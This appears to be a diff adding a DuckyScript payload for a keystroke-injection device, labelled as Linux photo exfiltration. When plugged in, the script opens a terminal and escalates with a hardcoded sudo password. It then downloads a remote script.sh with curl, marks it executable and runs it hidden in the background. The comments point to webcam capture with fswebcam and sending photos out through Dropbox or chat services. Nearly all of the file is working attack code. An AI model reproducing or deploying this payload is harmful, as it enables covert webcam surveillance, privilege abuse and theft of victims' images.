@@ -1,0 +1,65 @@
+
+REM ##################################################
+REM #                                                |
+REM # Title        : Exfiltrate Photos Through Shell |
+REM # Author       : Aleff                           |
+REM # Version      : 1.0                             |
+REM # Category     : Exfiltration                    |
+REM # Target       : Linux                           |
+REM #                                                |
+REM ##################################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
+REM     - sudo permissions
+REM         - if you need to install 'fswebcam'
+REM         - for add the -x permission to the script.sh downloaded
+
+REM REQUIRED - replace example.com with your script.sh link
+DEFINE SCRIPT-SH-LINK example.com
+
+REM REQUIRED - sudo Password
+DEFINE SUDO-PSWD example
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### Permission ####
+
+REM This section of sudo time depends by the computer power on which it runs.
+REM So if you know that the computer on which you run the payload is too slow, increase it by a few seconds, otherwise you can try running it as it is set now or smaller depending on your needs.
+
+STRING sudo su
+ENTER
+DELAY 500
+STRING SUDO-PSWD
+ENTER
+REM DELAY Based On Computer Power
+DELAY 5000
+
+REM If you want to install the dependency of fswebcam you should decommend it.
+REM STRING apt install fswebcam -y
+REM ENTER
+REM DELAY Based On Internet Power
+REM DELAY 5000
+
+
+REM #### Script ####
+
+
+STRING curl 
+STRING SCRIPT-SH-LINK
+STRING  > script.sh
+ENTER
+REM DELAY Based On Internet Power
+DELAY 4000
+
+STRING chmod +x script.sh
+ENTER
+DELAY 500
+
+STRING nohup ./script.sh > /dev/null 2>&1 & exit
+ENTER
